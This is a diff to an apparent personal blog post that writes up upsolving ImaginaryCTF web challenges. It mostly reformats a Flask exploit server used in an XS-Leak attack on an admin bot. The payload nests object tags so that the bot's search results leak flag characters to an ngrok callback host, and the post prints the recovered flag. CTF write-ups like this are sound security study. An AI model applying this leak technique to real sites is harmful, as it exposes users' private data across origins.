@@ -2,6 +2,7 @@
 title: "Upsolving Suite: Web Workshop"
 pubDate: "Jul 23 2023"
 description: Some web practice I did recently. (like very recently)
+heroImage: "/img/writeups/2023/upsolving/web-upsolve-hero.png"
 ---
 
 import CollapsableCodeBlock from "../../../../components/CollapsableCodeBlock.astro";
@@ -772,26 +773,26 @@ seen = set(alphabet)
 
 @app.route("/")
 def index():
-return "Hello, World!"
+    return "Hello, World!"
 
 @app.route("/attack-status")
 def attack_status():
-msg = f"""<h2>It has been {time.time() - start} seconds since the attack started.</h2>
+    msg = f"""<h2>It has been {time.time() - start} seconds since the attack started.</h2>
 
-<h3>Characters seen so far:</h3>
-<p>{"".join(sorted(seen))}</p>
-<br>
-<h3>Valid characters:</h3>
-<p>{list(set(alphabet) - seen)}</p>
-"""
-    return msg
+    <h3>Characters seen so far:</h3>
+    <p>{"".join(sorted(seen))}</p>
+    <br>
+    <h3>Valid characters:</h3>
+    <p>{list(set(alphabet) - seen)}</p>
+    """
+        return msg
 
 @app.route("/ping")
 def ping():
-global seen
-c = request.args.get("c", "")
-if c not in seen:
-seen.add(c)
+    global seen
+    c = request.args.get("c", "")
+    if c not in seen:
+        seen.add(c)
 
     return "pong"
 
@@ -802,14 +803,14 @@ known = "ictf{"
 payload = """<object data="http://mail.supersus.corp/emails/1?search=FLAG"><object data="NGROK/ping?c=GUESS"></object>"""
 
 def urlencode(s):
-return "".join([f"%{ord(c):02x}" if c not in alphabet else c for c in s]).encode()
+    return "".join([f"%{ord(c):02x}" if c not in alphabet else c for c in s]).encode()
 
 @app.route("/attack")
 def attack():
-global start, seen
-start = time.time()
-seen = set()
-guess = request.args.get("known", known)
+    global start, seen
+    start = time.time()
+    seen = set()
+    guess = request.args.get("known", known)
 
     for c in alphabet:
         r = remote("amogus-admin-bot.chal.imaginaryctf.org", 1337)
@@ -821,8 +822,8 @@ guess = request.args.get("known", known)
 
     return f"Attack started on {guess}. Check <a href='/attack-status'>attack status</a> for more info."
 
-if **name** == "**main**":
-app.run()
+if __name__ == "__main__":
+    app.run()
 
 ```
 </CollapsableCodeBlock>
@@ -830,9 +831,7 @@ app.run()
 Anyway, after running for a while, we can generate the final flag ~~ok idk if this is really the full flag, the infra is down so i cant test so this is taken from a writeup~~:
 
 ```
-
 ictf{i_guess_the_imposter_leaked_all_our_data_29f1ba23}
-
 ```
 
 This was an interesting XS Leak method that I hadn't seen before, and it stumped me during the real CTF. Upsolving was really satisifying.
